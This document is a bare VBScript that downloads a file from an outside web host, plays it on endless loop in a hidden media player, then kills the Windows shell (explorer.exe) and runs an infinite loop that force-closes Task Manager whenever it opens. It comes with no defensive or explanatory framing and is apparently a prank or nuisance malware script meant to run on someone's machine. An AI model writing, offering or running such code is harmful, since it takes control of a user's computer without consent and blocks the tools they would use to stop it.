Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName
'Get music data
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://pwcreatures.vercel.app/bin/music.mp3", False
xHttp.Send
with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
end with
'Set music
Set objShell = CreateObject("WScript.Shell")
Set objWMPlayer = CreateObject("WMPlayer.OCX")
strMusicPath = "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3"
objWMPlayer.URL = strMusicPath
objWMPlayer.settings.setMode "loop", True
objWMPlayer.settings.setMode "autoRewind", True
objWMPlayer.controls.play
WScript.Sleep 86400000
Set objShell = Nothing
Set objWMPlayer = Nothing
' Disable explorer.exe
Set objShell = CreateObject("WScript.Shell")
objShell.Run "taskkill /f /im explorer.exe", 0, True
' Disable Task Manager
Do
    If IsTaskManagerOpen() Then
        objShell.Run "taskkill /f /im Taskmgr.exe", 0, True
    End If
Loop
' Function to check if Task Manager is open
Function IsTaskManagerOpen()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    If colProcesses.Count > 0 Then
        IsTaskManagerOpen = True
    Else
        IsTaskManagerOpen = False
    End If
End Function


